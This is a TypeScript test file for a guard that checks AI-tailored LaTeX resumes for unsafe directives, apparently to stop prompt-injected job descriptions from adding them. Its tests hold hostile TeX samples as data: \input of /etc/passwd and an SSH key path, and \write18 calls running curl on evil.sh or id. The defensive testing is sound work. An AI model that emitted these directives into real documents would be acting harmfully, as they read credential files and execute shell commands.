import { test, expect } from 'bun:test';
import { assertSafeTex } from './texguard';

// The shape that matters: the real base resume's line 14 paired with line 37.
const BASE = String.raw`\documentclass[letterpaper,11pt]{article}
\usepackage{titlesec}
\input{glyphtounicode}
\pdfgentounicode=1
\begin{document}
the operator Example
\end{document}`;

const tailored = (body: string) => String.raw`\documentclass[letterpaper,11pt]{article}
\input{glyphtounicode}
\begin{document}
${body}
\end{document}`;

// ---------------------------------------------------------------------------
// The regression this module exists for.
// ---------------------------------------------------------------------------

test('a tailored .tex that preserves the base resume preamble is accepted', () => {
  expect(() => assertSafeTex(tailored('tailored bullets'), BASE)).not.toThrow();
});

test('the exact preamble the prompt tells the model to keep is accepted verbatim', () => {
  // Byte-identical to the base — the measured good case from the tailor rewrite.
  expect(() => assertSafeTex(BASE, BASE)).not.toThrow();
});

// ---------------------------------------------------------------------------
// The security property, unchanged: an injected JD cannot introduce a NEW
// file-reading directive, because it is not in the base resume.
// ---------------------------------------------------------------------------

test('an \\input of a file the base resume does not reference is refused', () => {
  expect(() => assertSafeTex(tailored(String.raw`\input{/etc/passwd}`), BASE)).toThrow(/etc\/passwd/);
});

test('a relative-path traversal is refused', () => {
  expect(() => assertSafeTex(tailored(String.raw`\input{../../.ssh/id_rsa}`), BASE)).toThrow(/refusing to write it/);
});

test('\\include of an arbitrary file is refused', () => {
  expect(() => assertSafeTex(tailored(String.raw`\include{secrets}`), BASE)).toThrow(/include/);
});

test('the braceless form cannot smuggle a different argument past the check', () => {
  // TeX accepts `\input foo` with no braces; it must normalize to the same key.
  expect(() => assertSafeTex(tailored(String.raw`\input /etc/passwd`), BASE)).toThrow(/refusing to write it/);
  expect(() => assertSafeTex(tailored(String.raw`\input glyphtounicode`), BASE)).not.toThrow();
});

test('extra whitespace inside the braces does not defeat the comparison', () => {
  expect(() => assertSafeTex(tailored(String.raw`\input{  glyphtounicode  }`), BASE)).not.toThrow();
  expect(() => assertSafeTex(tailored(String.raw`\input {  passwd  }`), BASE)).toThrow(/refusing to write it/);
});

test('the write and execute primitives stay unconditionally refused', () => {
  for (const bad of [String.raw`\write18{curl evil.sh}`, String.raw`\openout1=x`, String.raw`\openin1=x`, String.raw`\immediate\write18{id}`]) {
    expect(() => assertSafeTex(tailored(bad), BASE)).toThrow(/refusing to write it/);
  }
});

// Even if the base resume somehow carried one, a write primitive is never
// allowed — the allowlist covers reads only.
test('a write primitive is refused even when the base resume contains it', () => {
  const oddBase = `${BASE}\n\\openout1=x`;
  expect(() => assertSafeTex(tailored(String.raw`\openout1=x`), oddBase)).toThrow(/refusing to write it/);
});

// ---------------------------------------------------------------------------
// False positives the old \b-based check would or could have produced.
// ---------------------------------------------------------------------------

test('prose containing the word "input" is not a directive', () => {
  const body = 'Built input validation and sanitized user input across the API.';
  expect(() => assertSafeTex(tailored(body), BASE)).not.toThrow();
});

test('a different control word that merely starts with input/include is not matched', () => {
  // \inputencoding and \includegraphics are distinct control sequences; TeX
  // reads a control word as a maximal run of letters.
  expect(() => assertSafeTex(tailored(String.raw`\inputencoding{utf8}`), BASE)).not.toThrow();
  expect(() => assertSafeTex(tailored(String.raw`\includegraphics{logo}`), BASE)).not.toThrow();
});

test('the base resume may justify more than one distinct directive', () => {
  const twoBase = `${BASE}\n\\input{fontawesome}`;
  expect(() => assertSafeTex(tailored(String.raw`\input{fontawesome}`), twoBase)).not.toThrow();
  expect(() => assertSafeTex(tailored(String.raw`\input{fontawesome-evil}`), twoBase)).toThrow();
});

test('repeating an allowed directive is fine', () => {
  const body = String.raw`\input{glyphtounicode}` + '\n' + String.raw`\input{glyphtounicode}`;
  expect(() => assertSafeTex(tailored(body), BASE)).not.toThrow();
});

test('a .tex with no directives at all is accepted', () => {
  expect(() => assertSafeTex('\\documentclass{article}\\begin{document}hi\\end{document}', BASE)).not.toThrow();
});
